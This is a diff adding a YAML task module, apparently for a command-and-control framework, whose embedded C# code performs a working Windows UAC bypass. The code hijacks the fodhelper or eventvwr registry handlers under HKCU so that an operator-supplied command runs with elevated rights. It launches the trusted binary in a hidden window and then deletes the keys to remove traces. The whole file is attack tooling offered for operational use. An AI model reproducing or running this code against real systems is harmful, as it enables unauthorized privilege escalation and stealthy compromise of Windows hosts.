@@ -1,0 +1,145 @@
+- Name: UAC_reg_bypass
+  Aliases: []
+  Description: uac bypass with eventvwr or fodhelper
+  Author: 
+      Name: amine brahmi
+      Handle: khraoverflow
+      Link: https://twitter.com/dr_whoami_
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using Microsoft.Win32;
+    using System.Threading;
+    using System.Diagnostics;
+
+    public static class Task
+    {
+        public static string Execute(string registryKey, string command)
+        {
+            try
+            {
+                RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+                string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
+                string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
+                alwaysNotify.Close();
+
+                if (consentPrompt == "2" & secureDesktopPrompt == "1")
+                {
+                    return "UAC is set to Always Notify. Not performing UAC bypass.";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+
+            if (registryKey.ToLower() == "fodhelper")
+            {
+                try
+                {
+                    RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+                    newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
+
+                    RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
+                    fod.SetValue("DelegateExecute", "");
+                    fod.SetValue("", command);
+                    fod.Close();
+
+                    Process p = new Process();
+                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
+                    p.Start();
+
+                    Thread.Sleep(10000);
+
+                    newkey.DeleteSubKeyTree("ms-settings");
+                    return "Fodhelper UAC bypass executed";
+                }
+                catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+            }
+            else if (registryKey.ToLower() == "eventvwr")
+            {
+                try
+                {
+                    RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+                    newkey.CreateSubKey(@"mscfile\Shell\Open\command");
+
+                    RegistryKey vwr = Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
+                    vwr.SetValue("", command);
+                    vwr.Close();
+
+                    Process p = new Process();
+                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    p.StartInfo.FileName = "C:\\windows\\system32\\eventvwr.exe";
+                    p.Start();
+
+                    Thread.Sleep(10000);
+
+                    newkey.DeleteSubKeyTree("mscfile");
+                    return "Eventvwr UAC bypass executed.";
+                }
+                catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+            }
+            else
+            {
+                return "Invalid bypass selected. Select either 'fodhelper' or 'eventvwr.'";
+            }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: registryKey
+    Value: ''
+    DefaultValue: 'fodhelper'
+    Description: use fodhelper or eventvwr
+    SuggestedValues:
+    - fodhelper
+    - eventvwr
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: command
+    Value: ''
+    DefaultValue: ''
+    Description: command to execute .
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: System.Drawing.dll
+    Location: net40\System.Drawing.dll
+    DotNetVersion: Net40
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net40
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net40
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net40
+  - Name: System.Windows.Forms.dll
+    Location: net40\System.Windows.Forms.dll
+    DotNetVersion: Net40
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Drawing.dll
+    Location: net35\System.Drawing.dll
+    DotNetVersion: Net35
+  - Name: System.Windows.Forms.dll
+    Location: net35\System.Windows.Forms.dll
+    DotNetVersion: Net35
+  EmbeddedResources: []
+
